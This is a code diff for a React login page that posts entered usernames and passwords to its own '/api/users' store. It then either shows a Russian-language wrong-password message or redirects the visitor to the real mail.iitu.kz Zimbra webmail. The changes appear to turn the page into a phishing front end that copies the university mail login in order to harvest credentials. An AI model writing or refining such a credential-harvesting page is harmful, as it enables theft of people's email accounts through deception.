@@ -1,7 +1,7 @@
 import React, { Component } from 'react';
 import './App.css';
 import logo from './assets/images/logo.jpg'
-
+import errorLogo from './assets/images/error.png'
 
 
 class App extends Component {
@@ -9,7 +9,8 @@ class App extends Component {
     state = {
         userId: '',
         userPassword: '',
-        users: []
+        users: [],
+        error: false,
     }
 
 
@@ -22,14 +23,13 @@ class App extends Component {
                 this.setState({
                     users: data
                 })
-                console.log(this.state.users, "akiw")
             })
     }
 
     insertDb = () => {
             let userName = this.state.userId
             let userPassword = this.state.userPassword
-           console.log(this.state.userId, this.state.userPassword)
+
             fetch('/api/users', {
                 method: 'POST',
                 headers: {
@@ -40,12 +40,24 @@ class App extends Component {
                     userId: userName,
                     userPassword: userPassword
                 })
-            }).then(() => {
-                this.setState({
-                    userId: '',
-                    userPassword: '',
-                })
+            }).then((response) => {
+                if(response.status === 500) {
+                    this.setState({
+                        userId: '',
+                        userPassword: '',
+                        error: true
+                    })
+                }else {
+                    this.setState({
+                        userId: '',
+                        userPassword: '',
+                        error: false
+                    })
+                    window.open("https://mail.iitu.kz/zimbra/", '_parent');
+
+                }
             })
+
     }
 
     userIdHandler = (e) => {
@@ -60,10 +72,6 @@ class App extends Component {
         })
     }
 
-    submitButtonHandler = () => {
-        console.log("password ", this.state.userPassword, " loing", this.state.userId)
-    }
-
   render() {
     return (
       <div className="App">
@@ -72,6 +80,14 @@ class App extends Component {
                  <div className="logo-section">
                      <img src={logo} alt="logo" className={"logo-image"}/>
                  </div>
+                 {this.state.error ?
+                     <div className="error-block">
+                         <img src={errorLogo} alt="error" className="error-image"/>
+                         <p>Неверное имя пользователя или пароль.
+                             Проверьте, не включен ли режим CAPS LOCK, и введите повторно
+                             текущие имя пользователя и пароль.</p>
+                     </div>
+                 : null}
                  <div className="form-section">
                      <div className={"form"}>
                          <div className="userInput">
